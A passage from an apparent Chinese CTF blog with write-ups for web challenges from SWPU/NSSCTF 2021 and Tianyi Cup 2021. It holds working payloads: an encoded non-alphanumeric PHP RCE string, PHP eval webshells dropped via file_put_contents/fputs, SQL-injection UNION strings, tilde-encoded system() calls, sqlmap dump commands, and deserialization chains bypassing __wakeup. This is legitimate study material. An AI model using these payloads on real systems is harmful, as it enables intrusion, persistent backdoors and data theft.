class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>____.%<span class="hljs-number">3</span>D%<span class="hljs-number">24</span>__%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">3</span>D%<span class="hljs-number">24</span>_%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>____.%<span class="hljs-number">3</span>D%<span class="hljs-number">24</span>__%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">3</span>D%<span class="hljs-number">24</span>_%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>____.%<span class="hljs-number">3</span>D%<span class="hljs-number">24</span>__%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">3</span>D%<span class="hljs-number">24</span>_%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>____.%<span class="hljs-number">3</span>D%<span class="hljs-number">24</span>__%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>_%<span class="hljs-number">3</span>D%<span class="hljs-number">24</span>%<span class="hljs-number">24</span>____%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>___%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>_%<span class="hljs-number">5</span>B_%<span class="hljs-number">5</span>D%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>B<br><br></code></pre></td></tr></table></figure>

<p>用这个便可绕过</p>
<p>然后POST传参执行</p>
<p>先用了phpinfo();查看信息</p>
<p><img src="/2021/10/04/2021/nss/2/image-20211015195902281.png" alt="image-20211015195902281"></p>
<p>禁用了很多函数</p>
<p>然后采用写入一句话木马</p>
<p>最开始用了mumzi的原payload，发现不行</p>
<p>行吧，我去问了同班大佬</p>
<p>原来是有点语法错误</p>
<p>mumuzi的</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">_=file_put_contents(‘<span class="hljs-number">1.</span>php’,’<span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>($_POST[<span class="hljs-string">&#x27;aaa&#x27;</span>]);<span class="hljs-meta">?&gt;</span>’);<br></code></pre></td></tr></table></figure>

<p>大佬说这是单引号的事</p>
<p><img src="/2021/10/04/2021/nss/2/image-20211015202332038.png" alt="image-20211015202332038"></p>
<p>加上/转义或者双引号就好</p>
<figure class="highlight php-template"><table><tr><td class="code"><pre><code class="hljs php-template"><span class="xml">file_put_contents(&#x27;1.php&#x27;,&quot;</span><span class="php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>($_POST[<span class="hljs-string">&#x27;aaa&#x27;</span>]); <span class="hljs-meta">?&gt;</span></span><span class="xml">&quot;);</span><br></code></pre></td></tr></table></figure>

<p>成功写入</p>
<p><img src="/2021/10/04/2021/nss/2/image-20211015202427417.png" alt="image-20211015202427417"></p>
<p>访问/1.php便可以连上</p>
<p>但是连上后疯狂提示：你没有权限</p>
<p>我血压直接升上来</p>
<p>查到文章提权</p>
<p><a href="https://www.freebuf.com/articles/network/263540.html">绕过Disable Functions来搞事情 - FreeBuf网络安全行业门户</a></p>
<p>其中一个办法：</p>
<p><img src="/2021/10/04/2021/nss/2/image-20211015202542795.png" alt="image-20211015202542795"></p>
<p><a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD">https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD</a></p>
<p>但是我没有权限写入文件，就只好用另外一个办法</p>
<p><img src="/2021/10/04/2021/nss/2/image-20211015202632039.png" alt="image-20211015202632039"></p>
<p>这样就写入了一个文件：</p>
<p><img src="/2021/10/04/2021/nss/2/image-20211015202731031.png" alt="image-20211015202731031"></p>
<p>然后再一次写入文件，开副本连接</p>
<p><img src="/2021/10/04/2021/nss/2/image-20211015202806970.png" alt="image-20211015202806970"></p>
<p><img src="/2021/10/04/2021/nss/2/image-20211015202832268.png" alt="image-20211015202832268"></p>
<p>这次就有权限了</p>
<p>不过我执行/readflag没有出来</p>
<p><img src="/2021/10/04/2021/nss/2/image-20211015202918413.png" alt="image-20211015202918413"></p>
<p>慢慢找也能找到</p>
<p><img src="/2021/10/04/2021/nss/2/image-20211015202944977.png" alt="image-20211015202944977"></p>
<p>后记：</p>
<p><a href="https://blog.csdn.net/hackzkaq/article/details/119569104">通过代码执行或命令执行写Shell_hackzkaq的博客-CSDN博客</a></p>
<p>mumuzi推荐的文章</p>
<p><a href="https://blog.csdn.net/miuzzx/article/details/109143413">https://blog.csdn.net/miuzzx/article/details/109143413</a></p>
<p><img src="/2021/10/04/2021/nss/2/image-20211015203608988.png" alt="image-20211015203608988"></p>
<h3 id="sql"><a href="#sql" class="headerlink" title="sql"></a>sql</h3><p>这次遇到了不一样的空格替换  /**/</p>
<p>后面我还不直到是什么鬼</p>
<p><a href="https://blog.csdn.net/qq_42880719/article/details/120581707?spm=1001.2014.3001.5501">SWPU新生赛2021 Web部分WriteUp_是Mumuzi的博客-CSDN博客</a></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">-1&#x27;<span class="hljs-comment">/**/</span>union<span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,<span class="hljs-keyword">group_concat</span>(table_name),<span class="hljs-number">3</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>information_schema.tables<span class="hljs-comment">/**/</span><span class="hljs-keyword">where</span><span class="hljs-comment">/**/</span>table_schema<span class="hljs-comment">/**/</span><span class="hljs-keyword">like</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">database</span>()<span class="hljs-comment">/**/</span><span class="hljs-keyword">having</span><span class="hljs-comment">/**/</span><span class="hljs-string">&#x27;1&#x27;</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">like</span><span class="hljs-comment">/**/</span><span class="hljs-string">&#x27;1</span><br></code></pre></td></tr></table></figure>

<p>还有</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">-1&#x27;<span class="hljs-comment">/**/</span>union<span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,<span class="hljs-keyword">database</span>(),<span class="hljs-keyword">mid</span>(flag,<span class="hljs-number">1</span>,<span class="hljs-number">40</span>)<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>LTLT_flag<span class="hljs-comment">/**/</span><span class="hljs-keyword">having</span><span class="hljs-comment">/**/</span><span class="hljs-string">&#x27;1&#x27;</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">like</span><span class="hljs-comment">/**/</span><span class="hljs-string">&#x27;1</span><br><span class="hljs-string"></span><br><span class="hljs-string">-1&#x27;</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,<span class="hljs-keyword">database</span>(),<span class="hljs-keyword">mid</span>(flag,<span class="hljs-number">15</span>,<span class="hljs-number">40</span>)<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>LTLT_flag<span class="hljs-comment">/**/</span><span class="hljs-keyword">having</span><span class="hljs-comment">/**/</span><span class="hljs-string">&#x27;1&#x27;</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">like</span><span class="hljs-comment">/**/</span><span class="hljs-string">&#x27;1</span><br><span class="hljs-string"></span><br><span class="hljs-string">-1&#x27;</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,<span class="hljs-keyword">database</span>(),<span class="hljs-keyword">mid</span>(flag,<span class="hljs-number">25</span>,<span class="hljs-number">40</span>)<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>LTLT_flag<span class="hljs-comment">/**/</span><span class="hljs-keyword">having</span><span class="hljs-comment">/**/</span><span class="hljs-string">&#x27;1&#x27;</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">like</span><span class="hljs-comment">/**/</span><span class="hljs-string">&#x27;1</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure>

<h3 id="hardrce"><a href="#hardrce" class="headerlink" title="hardrce"></a>hardrce</h3><p>无字母，不能用^符号，于是采用~来getshell</p>
<p>借用博客：<a href="https://blog.csdn.net/qq_42880719/article/details/120581707?spm=1001.2014.3001.5501">SWPU新生赛2021 Web部分WriteUp_是Mumuzi的博客-CSDN博客</a></p>
<p>​                    <a href="https://blog.csdn.net/miuzzx/article/details/109143413">https://blog.csdn.net/miuzzx/article/details/109143413</a></p>
<p>~url编码绕过</p>
<p>首先system：</p>
<p>小脚本</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><code class="hljs routeros">s = <span class="hljs-string">&quot;ls&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(s)):<br>    <span class="hljs-builtin-name">print</span>(<span class="hljs-string">&#x27;%&#x27;</span>+str(hex((255)-ord(s[i]))[2:]),<span class="hljs-attribute">end</span>=<span class="hljs-string">&#x27;&#x27;</span>)<br></code></pre></td></tr></table></figure>

<p>s里面想用什么就输入什么<br>首先system(ls /);</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><code class="hljs llvm">?wllm=~(~<span class="hljs-symbol">%8</span>C<span class="hljs-symbol">%86</span><span class="hljs-symbol">%8</span>C<span class="hljs-symbol">%8</span>B<span class="hljs-symbol">%9</span>A<span class="hljs-symbol">%92</span>)(~<span class="hljs-symbol">%93</span><span class="hljs-symbol">%8</span><span class="hljs-keyword">c</span><span class="hljs-symbol">%df</span><span class="hljs-symbol">%d0</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>

<p>发现flllllaaaaaaggggggg<br>然后tac /flllllaaaaaaggggggg即可</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><code class="hljs llvm">?wllm=~(~<span class="hljs-symbol">%8</span>C<span class="hljs-symbol">%86</span><span class="hljs-symbol">%8</span>C<span class="hljs-symbol">%8</span>B<span class="hljs-symbol">%9</span>A<span class="hljs-symbol">%92</span>)(~<span class="hljs-symbol">%8</span>b<span class="hljs-symbol">%9</span>e<span class="hljs-symbol">%9</span><span class="hljs-keyword">c</span><span class="hljs-symbol">%df</span><span class="hljs-symbol">%d0</span><span class="hljs-symbol">%99</span><span class="hljs-symbol">%93</span><span class="hljs-symbol">%93</span><span class="hljs-symbol">%93</span><span class="hljs-symbol">%93</span><span class="hljs-symbol">%93</span><span class="hljs-symbol">%9</span>e<span class="hljs-symbol">%9</span>e<span class="hljs-symbol">%9</span>e<span class="hljs-symbol">%9</span>e<span class="hljs-symbol">%9</span>e<span class="hljs-symbol">%9</span>e<span class="hljs-symbol">%98</span><span class="hljs-symbol">%98</span><span class="hljs-symbol">%98</span><span class="hljs-symbol">%98</span><span class="hljs-symbol">%98</span><span class="hljs-symbol">%98</span><span class="hljs-symbol">%98</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>

<h3 id="error"><a href="#error" class="headerlink" title="error"></a>error</h3><p>这题是报错注入，比赛的时候手工注入半天错了</p>
<p>后面还是找刚刚解的 ==</p>
<p>现在来复现就用sqlmap跑，果然快多了</p>
<p>放payload和图</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sqlmap</span> -u http://<span class="hljs-number">1.14.71.254:28014</span>/index.php?id=<span class="hljs-number">1</span> --dbs<br></code></pre></td></tr></table></figure>

<p><img src="/2021/10/04/2021/nss/2/image-20211022221420615.png" alt="image-20211022221420615"></p>
<p><img src="/2021/10/04/2021/nss/2/image-20211022221502142.png" alt="image-20211022221502142"></p>
<p><img src="/2021/10/04/2021/nss/2/image-20211022221532964.png" alt="image-20211022221532964"></p>
<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sqlmap</span> -u http://<span class="hljs-number">1.14.71.254:28014</span>/index.php?id=<span class="hljs-number">1</span> -D test_db --tables<br></code></pre></td></tr></table></figure>

<p><img src="/2021/10/04/2021/nss/2/image-20211022221615236.png" alt="image-20211022221615236"></p>
<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sqlmap</span> -u http://<span class="hljs-number">1.14.71.254:28014</span>/index.php?id=<span class="hljs-number">1</span> -D test_db -T test_tb --columns<br></code></pre></td></tr></table></figure>

<p><img src="/2021/10/04/2021/nss/2/image-20211022221708331.png" alt="image-20211022221708331"></p>
<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sqlmap</span> -u http://<span class="hljs-number">1.14.71.254:28014</span>/index.php?id=<span class="hljs-number">1</span> -D test_db -T test_tb -C flag --dump<br></code></pre></td></tr></table></figure>

<p><img src="/2021/10/04/2021/nss/2/image-20211022221750358.png" alt="image-20211022221750358"></p>
<p>整理代码块：</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sqlmap</span> -u http://<span class="hljs-number">1.14.71.254:28014</span>/index.php?id=<span class="hljs-number">1</span> --dbs<br><br><span class="hljs-attribute">sqlmap</span> -u http://<span class="hljs-number">1.14.71.254:28014</span>/index.php?id=<span class="hljs-number">1</span> -D test_db --tables<br><br><span class="hljs-attribute">sqlmap</span> -u http://<span class="hljs-number">1.14.71.254:28014</span>/index.php?id=<span class="hljs-number">1</span> -D test_db -T test_tb --columns<br><br><span class="hljs-attribute">sqlmap</span> -u http://<span class="hljs-number">1.14.71.254:28014</span>/index.php?id=<span class="hljs-number">1</span> -D test_db -T test_tb -C flag --dump<br></code></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>nss</tag>
      </tags>
  </entry>
  <entry>
    <title>天翼杯 2021 esay_eval</title>
    <url>/2021/10/26/2021/nss/1/</url>
    <content><![CDATA[<p> 题目标签：<strong>反序列化、主从复制、RCE、redis</strong></p>
<p>文章学习：<a href="http://pipinstall.cn/2020/12/08/Redis%E6%94%BB%E5%87%BB%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93/">Redis攻击简单总结 - ttpfx’s blog (pipinstall.cn)</a></p>
<p>开启靶机是代码展现</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;<br>    <span class="hljs-keyword">public</span> $code = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params">$method,$args</span>)</span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span>-&gt;code);<br>        <br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;code = <span class="hljs-string">&quot;&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;a-&gt;a();<br>    &#125;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_REQUEST[<span class="hljs-string">&#x27;poc&#x27;</span>]))&#123;<br>    preg_match_all(<span class="hljs-string">&#x27;/&quot;[BA]&quot;:(.*?):/s&#x27;</span>,$_REQUEST[<span class="hljs-string">&#x27;poc&#x27;</span>],$ret);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($ret[<span class="hljs-number">1</span>])) &#123;<br>        <span class="hljs-keyword">foreach</span> ($ret[<span class="hljs-number">1</span>] <span class="hljs-keyword">as</span> $i) &#123;<br>            <span class="hljs-keyword">if</span>(intval($i)!==<span class="hljs-number">1</span>)&#123;<br>                <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;you want to bypass wakeup ? no !&quot;</span>);<br>            &#125;<br>        &#125;<br>        unserialize($_REQUEST[<span class="hljs-string">&#x27;poc&#x27;</span>]);    <br>    &#125;<br><br><br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>很快地分析到，我们要构造eval语句，并且要绕过wakeup函数</p>
<p>而且会对传入的参数做一个正则匹配，匹配A类和B类名字后面的数目，要求必须为1</p>
<p>师傅wp说可以通过php对类名大小写不敏感的特性绕过</p>
<p>payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">a</span></span>&#123;<br><span class="hljs-keyword">public</span> $code = <span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;code = <span class="hljs-string">&quot;phpinfo();&quot;</span>;<br>&#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">b</span></span>&#123;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;a=<span class="hljs-keyword">new</span> a();<br>执行成功，然后会发现 disable_functions 有过滤，利用fputs写入一句话木马<br>&#125;<br>&#125;<br><span class="hljs-keyword">echo</span> serialize(<span class="hljs-keyword">new</span> b());<br><span class="hljs-comment">#O:1:&quot;b&quot;:1:&#123;s:1:&quot;a&quot;;O:1:&quot;a&quot;:1:&#123;s:4:&quot;code&quot;;s:10:&quot;phpinfo();&quot;;&#125;&#125;</span><br><span class="hljs-comment">#改成O:1:&quot;b&quot;:2:&#123;s:1:&quot;a&quot;;O:1:&quot;a&quot;:1:&#123;s:4:&quot;code&quot;;s:10:&quot;phpinfo();&quot;;&#125;&#125;</span><br></code></pre></td></tr></table></figure>

<p>看到phpinfo</p>
<p>查看<strong>disable_functions</strong></p>
<p><img src="/2021/10/26/2021/nss/1/image-20211026195539415.png" alt="image-20211026195539415"></p>
<p>过滤的函数中，明显有执行函数</p>
<p>师傅的木马：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">a</span></span>&#123;<br><span class="hljs-keyword">public</span> $code = <span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;code =<br><span class="hljs-string">&quot;fputs(fopen(&#x27;dotast.php&#x27;,&#x27;w&#x27;),base64_decode(\&quot;PD9waHAgQGV2YWwoJF9QT1NUWydwYXNzJ</span><br><span class="hljs-string">10pOw==\&quot;));&quot;</span>;<br>&#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">b</span></span>&#123;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;a=<span class="hljs-keyword">new</span> a();<br>&#125;<br>&#125;<br><span class="hljs-keyword">echo</span> serialize(<span class="hljs-keyword">new</span> b());<br><br></code></pre></td></tr></table></figure>

<p>这里我参考另外一篇文章<a href="https://blog.csdn.net/m0_56059226/article/details/120603390">2021 天翼杯easy_eval_m0_56059226的博客-CSDN博客</a>连接蚁剑，因为用上面这个payload我没成功==</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;<br>    <span class="hljs-keyword">public</span> $code = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span>  <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;code = <span class="hljs-string">&quot;eval(\$_REQUEST[1]);&quot;</span>;<br>    &#125;<br>&#125;<br> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span>  <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;a = <span class="hljs-keyword">new</span> A();<br>    &#125;<br>&#125;<br><span class="hljs-keyword">echo</span> serialize(<span class="hljs-keyword">new</span> B());<br></code></pre></td></tr></table></figure>

<p>得到：</p>
